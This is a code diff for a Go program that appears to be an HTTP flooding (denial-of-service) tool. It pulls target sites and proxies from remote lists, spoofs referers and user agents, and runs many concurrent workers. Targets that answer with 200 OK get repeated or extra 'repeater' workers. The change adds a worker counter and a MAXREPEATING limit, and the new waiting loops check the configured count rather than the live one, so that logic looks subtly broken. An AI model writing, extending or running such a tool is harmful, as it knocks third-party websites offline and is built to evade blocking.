@@ -33,6 +33,10 @@ var repeatsleepbefore int
 var repeaterspawnnewworkers bool
 var repeaterspawnnewworkerscount int
 
+var repeatingworkercountactual int = 0
+
+var maxrepeatingworkers int
+
 var referers[] string
 var useragentsandroid[] string
 var useragentsios[] string
@@ -140,7 +144,7 @@ func getProxies() ProxyStruct {
 	return sites
 }
 
-func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, id int) {
+func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, id int, repeatingbus chan int) {
 	var myClient *http.Client
 	if useProxy {
 		if len(proxyAuth) > 0 {
@@ -164,6 +168,8 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 	if err != nil {
 		if(ebus != nil) {
 			ebus <- id
+		} else {
+			repeatingbus <- 0
 		}
 		return
 	}
@@ -175,6 +181,8 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 		}
 		if(ebus != nil) {
 			ebus <- id
+		} else {
+			repeatingbus <- 0
 		}
 		return
 	}
@@ -185,27 +193,32 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 		}
 		if(ebus != nil) {
 			ebus <- id
+		} else {
+			repeatingbus <- 0
 		}
 		return
 	}
-	log.Println("200 OK!", target)
 	if(repeattarget) {
-		if(ebus == nil){ 
-			log.Println("Continuing to targeting a ", target)
-		} else {
-			log.Println("Found a working target, repeating or spawning ", target)
-		}
 		if(repeaterspawnnewworkers && ebus != nil) {
-			fmt.Print("Spawning repeater worker... ")
+			fmt.Println("200 OK! Spawning repeater workers... ", target)
 			for i := 0; i < repeaterspawnnewworkerscount; i++ {
+				for(repeaterspawnnewworkerscount >= maxrepeatingworkers){
+					time.Sleep(time.Millisecond * 50)
+				}
 				time.Sleep(time.Duration(repeatsleepbefore) * time.Millisecond)
-				go requestMe(target, proxyUrl, proxyAuth, nil, i)
+				go requestMe(target, proxyUrl, proxyAuth, nil, i, repeatingbus)
+				repeatingbus <- 1
 			}
 
 			ebus <- id
 			
 		} else {
-			requestMe(target, proxyUrl, proxyAuth, ebus, id)
+			if(ebus == nil){ 
+				log.Println("200 OK! Continue to target a ", target)
+			} else {
+				log.Println("200 OK! Found a working target, repeating ", target)
+			}
+			requestMe(target, proxyUrl, proxyAuth, ebus, id, repeatingbus)
 		}
 	} else {
 		if(ebus != nil) {
@@ -372,20 +385,24 @@ func setRandomHeaders(header *http.Header) {
 	}
 }
 
-func gogogo(ebus chan int, id int) {
+func gogogo(ebus chan int, id int, repeatingbus chan int) {
 	nSite := rand.Int() % len(sites)
 	nProxy := rand.Int() % len(proxies)
 
 	site := sites[nSite]
 	proxy := proxies[nProxy]
-	requestMe(site.Page, proxy.IP, proxy.Auth, ebus, id)
+	requestMe(site.Page, proxy.IP, proxy.Auth, ebus, id, repeatingbus)
 
 }
 
-func spawner(ebus chan int) {
+func spawner(ebus chan int, repeatingbus chan int) {
 	for true {
 		id := <-ebus
-		go gogogo(ebus, id)
+		for(repeattarget && repeaterspawnnewworkerscount >= maxrepeatingworkers){
+			time.Sleep(time.Millisecond * 50)
+			fmt.Println("Waiting for more workers available")
+		}
+		go gogogo(ebus, id, repeatingbus)
 	}
 }
 
@@ -396,6 +413,17 @@ func configUpdater() {
 		sites = getSites()
 		proxies = getProxies()
 		fmt.Println("CONFIG UPDATED")
+	}
+
+}
+func repeatworkercount(bus chan int) {
+	for true {
+		was := <-bus
+		if(was == 0) {
+			repeatingworkercountactual = repeatingworkercountactual - 1
+		} else {
+			repeatingworkercountactual = repeatingworkercountactual + 1
+		}
 	}
 
 }
@@ -427,6 +455,8 @@ func main() {
 	repeaterspawnnewworkersOs := os.Getenv("REPEATERSPAWNNEWWORKERS")
 	repeaterspawnnewworkers = repeaterspawnnewworkersOs == "true"
 
+	maxrepeatingworkers, _ = strconv.Atoi(os.Getenv("MAXREPEATING"))
+
 	repeattarget = repeattargetOs == "true"
 	devices = make([]string, 4)
 	devices[0] = "ANDROID"
@@ -436,15 +466,17 @@ func main() {
 
 	rand.Seed(time.Now().Unix())
 	eventbus := make(chan int)
+	repeatingbus := make(chan int)
 	sites = getSites()
 	proxies = getProxies()
 	for i := 0; i < workers/100+1; i++ {
 		fmt.Println("Spawning spawner", i)
-		go spawner(eventbus)
+		go spawner(eventbus, repeatingbus)
 	}
 	for i := 0; i < workers; i++ {
 		fmt.Println("Spawning worker", i)
-		go gogogo(eventbus, i)
+		go gogogo(eventbus, i, repeatingbus)
 	}
+	go repeatworkercount(repeatingbus)
 	configUpdater()
 }
